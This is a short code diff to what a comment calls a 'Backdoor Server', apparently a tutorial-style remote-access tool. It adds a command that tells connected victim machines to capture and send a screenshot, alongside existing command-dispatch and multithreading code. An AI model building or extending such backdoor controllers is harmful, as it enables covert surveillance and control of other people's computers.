@@ -271,6 +271,10 @@ def send_commands():
             strSite = 'site' + strChoice[4:]
             send(str.encode(strSite))
 
+        elif strChoice == '--p' or strChoice == 'screenshot':
+            screenshot()
+
+
         # TODO: Own Implementation
         # --h, See Commands List Help Menu
         elif strChoice == '--h' or strChoice == 'help':
@@ -282,9 +286,14 @@ def send_commands():
             close()
             exit(0)
 
+def screenshot():
+    send(b'screen')
+    # send(str.encode('screen'))
 
 
-""" Section 2: Implement Multithreading """
+
+""" Note: All Function should write before this section"""
+""" Last Section of Backdoor Server: Implement Multithreading """
 # Step 9: Define a Function to Create Threads and run work() Multithreading
 def create_threads():
     for _ in range(intThreads):
@@ -326,7 +335,7 @@ def work():
         queue.task_done()
         exit(0)
 
-# Step 11: Call Function's to Run the app on Multithreading
+# This functions should call in the Last Line, Call Function's to Run the app on Multithreading
 create_threads()
 create_jobs()
 
